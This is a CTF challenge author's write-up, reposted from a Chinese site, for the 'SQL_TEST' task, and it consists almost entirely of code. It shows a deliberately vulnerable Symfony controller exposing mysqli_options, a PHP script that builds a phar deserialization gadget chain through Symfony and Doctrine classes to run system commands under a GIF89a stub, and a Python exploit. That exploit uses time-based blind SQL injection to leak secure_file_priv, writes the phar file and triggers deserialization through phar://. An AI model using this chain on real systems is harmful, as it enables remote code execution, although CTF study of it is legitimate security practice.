# TQLCTF-SQL_TEST出题笔记

> 原文: https://www.ctfiot.com/27107.html
> ID: 27107


```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
<?php

namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\HttpFoundation\Request;

class TestController extends AbstractController
{
 /**
 * @Route("/test", name="test")
 */
 public function index(Request $request): Response
 {
 $con = mysqli_init();
 $key = $request->query->get('key');
 $value = $request->query->get('value');

 if (is_numeric($key) && is_string($value)) {
 mysqli_options($con, $key, $value);
 }

 mysqli_options($con, MYSQLI_OPT_LOCAL_INFILE, 0);
 if (!mysqli_real_connect($con, "127.0.0.1", "ctf", "gmlsec123456", "mysql")) {
 $content = '数据库连接失败';
 } else {
 $content = '数据库连接成功';
 }

 mysqli_close($con);

 return new Response(
 $content,
 Response::
HTTP_OK,
 ['content-type' => 'text/html']
 );
 }
}
1
2
3
4
5
6
~  php -a
Interactive shell

php > echo MYSQLI_INIT_COMMAND;
3
php >
1
2
3
4
5
6
public function __call(string $method, array $args)
{
 $this->ready ?: $this->ready = $this->initializer->__invoke($this->redis);

 return $this->redis->{$method}(...$args);
}
1
2
3
4
5
6
7
8
9
10
11
/** @param string|AbstractAsset $assetName */
public function __invoke($assetName): bool
{
 foreach ($this->schemaAssetFilters as $schemaAssetFilter) {
 if ($schemaAssetFilter($assetName) === false) {
 return false;
 }
 }

 return true;
}
1
2
3
4
public function __invoke($var): string
{
 return ($this->handler)($var);
}
1
2
3
4
public function __destruct()
{
 $this->commit();
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
<?php

//namespace Doctrine\Bundle\DoctrineBundle\Dbal {
// class SchemaAssetsFilterManager
// {
// private $schemaAssetFilters;
//
// public function __construct()
// {
// $this->schemaAssetFilters = array('system');
// }
// }
//}
namespace Symfony\Component\Console\Helper {
 class Dumper
 {
 private $handler;

 public function __construct()
 {
 $this->handler = 'system';
 }
 }
}

namespace Symfony\Component\Cache\Traits {
 class RedisProxy
 {
 private $redis;
 private $initializer;
 private $ready = false;

 public function __construct()
 {
 $this->redis = 'id';
 $this->initializer = new \Symfony\Component\Console\Helper\Dumper();
// $this->initializer = new \Doctrine\Bundle\DoctrineBundle\Dbal\SchemaAssetsFilterManager();
 }
 }
}

namespace Doctrine\Common\Cache\Psr6 {
 class CacheAdapter
 {
 private $deferredItems;

 public function __construct()
 {
 $this->deferredItems = array(new \Symfony\Component\Cache\Traits\RedisProxy());
 }
 }
}

namespace {
 $a = new Doctrine\Common\Cache\Psr6\CacheAdapter();
 $phar = new Phar('test.phar');
 $phar->stopBuffering();
 $phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");
 $phar->addFromString('test.txt', 'test');
 $phar->setMetadata($a);
 $phar->stopBuffering();
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
import requests, string, random, os, time

url = "http://127.0.0.1:
7001"

def req(key, value):
 resp = requests.get(url + "/index.php/test", params={'key': key, 'value': value})
 return resp

def get_secure_file_priv():
 char_list = "_/" + string.ascii_letters + string.digits
 template = "select if((select substr(@@global.secure_file_priv,%s,1)='%s'),sleep(2),1)"
 data = ''
 for i in range(1, 100):
 flag = False
 for c in char_list:
 resp = req('3', template % (i, c))
 if resp.elapsed.seconds > 1.5:
 data += c
 flag = True
 print(data)
 break
 if not flag:
 print("end!")
 return data

def exp(secure_file_path):
 filename = "".join(random.sample(string.ascii_letters, 6)) + '.phar'
 file = os.path.join(secure_file_path, filename)

 # write phar file
 hex_data = open("test.phar", "rb").read().hex()
 command = "select 0x{} into dumpfile '{}'".format(hex_data, file)
 req('3', command)

 # check file exists
 command = "select if((ISNULL(load_file('{}'))),sleep(2),1)".format(file)
 if req('3', command).elapsed.seconds > 1.5:
 print("file write fail!")
 exit()

 # clean the cache
 req('3',"FLUSH PRIVILEGES")
 time.sleep(2)

 # trigger unserialize
 resp = req('35', 'phar://' + file)
 print(resp.text)

if __name__ == '__main__':
 secure_file_path = get_secure_file_priv()
 # secure_file_path = '/tmp/1ba652f29a29b74c5c7abb1abf6ba36e/'
 exp(secure_file_path)
```
